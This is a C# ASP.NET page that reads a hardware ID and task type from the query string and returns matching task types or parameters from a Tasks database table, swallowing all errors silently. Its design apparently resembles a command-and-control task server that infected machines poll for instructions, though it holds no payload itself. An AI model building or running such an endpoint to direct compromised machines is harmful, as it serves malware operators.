using System;
using System.Data.SqlClient;

public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
            {
                conn.Open();
                string Type = Request.QueryString["Type"];
                string HWID = Request.QueryString["HWID"];
                FooSpan.InnerText = Type;
                if (Type == null || Type == "")
                {

                    int Amount;
                    string type = "nop";
                    FooSpan.InnerText = ";";

                    using (SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Tasks WHERE HWID = @HWID", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", HWID);
                        Amount = (int)cmd.ExecuteScalar();
                    }

                    for (int i = 1; i <= Amount; i++)
                    {
                        using (SqlCommand cmd = new SqlCommand("select type from (select type,DENSE_RANK() over (order by type) as rownum from Tasks where hwid = @HWID) as tbl where tbl.rownum = @i", conn))
                        {
                            cmd.Parameters.AddWithValue("HWID", HWID);
                            cmd.Parameters.AddWithValue("i", i);
                            type = cmd.ExecuteScalar().ToString();
                            FooSpan.InnerText += type + ";";
                        }
                    }
                }

                else
                {
                    FooSpan.InnerText = ";";
                    string par1;
                    using (SqlCommand cmd = new SqlCommand("select Parameter1 from Tasks where HWID = @HWID and Type = @Type", conn))
                    {
                        cmd.Parameters.AddWithValue("Type", Type);
                        cmd.Parameters.AddWithValue("HWID", HWID);
                        par1 = (string)cmd.ExecuteScalar();
                        FooSpan.InnerText += par1 + ";";
                    }
                }
            }
        }
        catch { }
    }
}
